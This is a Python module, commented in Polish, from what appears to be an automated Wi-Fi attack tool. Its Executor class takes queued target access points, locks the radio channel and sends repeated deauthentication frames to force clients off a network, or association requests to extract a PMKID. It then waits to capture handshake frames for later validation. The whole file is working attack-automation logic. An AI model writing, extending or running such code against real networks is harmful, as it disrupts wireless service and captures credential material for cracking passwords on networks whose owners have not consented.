import asyncio
import time
import logging
from .validator import Validator

class Executor:
    def __init__(self, db, api, attack_queue, brain, shared_state):
        self.db = db
        self.api = api
        self.attack_queue = attack_queue
        self.brain = brain
        self.shared_state = shared_state
        self.validator = Validator(db, shared_state)
        self.running = True
        
        # Konfiguracja TTL (Czas życia ataku w kolejce, jeśli utknął na dłużej niż minutę -> odpada)
        self.ttl = 60 

    async def run(self):
        """Konsument Kolejki Ataków (Attack Queue)"""
        while self.running:
            try:
                # Blokuje się na kolejce, z wymuszonym timeoutem (Fail-safe)
                payload = await asyncio.wait_for(self.attack_queue.get(), timeout=5)
                
                bssid = payload['bssid']
                
                # Zwalniamy BSSID z pamięci podręcznej Braina
                if bssid in self.brain.in_attack_queue:
                    self.brain.in_attack_queue.remove(bssid)
                    
                # TTL Check (Zabezpieczenie przed atakiem na router sprzed 20 minut)
                if time.time() - payload['timestamp'] > self.ttl:
                    self.attack_queue.task_done()
                    continue
                    
                await self.execute_attack(payload)
                self.attack_queue.task_done()
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                logging.error(f"Executor Error: {e}")

    async def execute_attack(self, payload):
        """Wykonywanie strzałów z blokadą kanału i sleepami"""
        bssid = payload['bssid']
        channel = payload['channel']
        attack_type = payload['type']
        client_mac = payload['client_mac']
        essid = payload.get('essid', '<ukryty>')
        rssi = payload.get('rssi', '?')

        # Aktualizacja UI dla użytkownika z ikoną ASCII
        ikona = "⚡ PMKID" if attack_type == 'pmkid' else "🔥 DEAUTH"
        self.shared_state['action'] = f"ATAK {ikona} na {bssid} ({essid}) [{rssi} dBm]"

        # 1. ZABLOKOWANIE KANAŁU (Rozwiązuje problem losowych strzałów)
        await self.api.set_channel(channel)
        
        # Oczekujemy krótko na przestrojenie radia
        await asyncio.sleep(0.5)

        # 2. EGZEKUCJA Z PAUZAMI
        if attack_type == 'deauth' and client_mac:
            for _ in range(3):
                await self.api.send_deauth(bssid, client_mac)
                await asyncio.sleep(0.5)
        elif attack_type == 'pmkid':
            for _ in range(3):
                await self.api.send_assoc(bssid)
                await asyncio.sleep(0.5)

        # Aktualizacja statusu
        await self.db.mark_attack(bssid, attack_type)

        # 3. NASŁUCH NA KANALE 
        # Czekamy np. 10 sekund mając zablokowany dany kanał w nadziei, że złapiemy M1/M2/PMKID
        await asyncio.sleep(10)

        # 4. ZWOLNIENIE KANAŁU (Przywrócenie Hoppingu w API)
        await self.api.set_channel('clear')
        
        # Przywrócenie napisu skanowania
        if f"ATAK" in self.shared_state.get('action', ''):
            self.shared_state['action'] = "Skanowanie eteru..."
            
        # 5. ASYNCHRONICZNA WALIDACJA (Race Condition safe)
        asyncio.create_task(self.validator.check_pcap(bssid, attack_type))
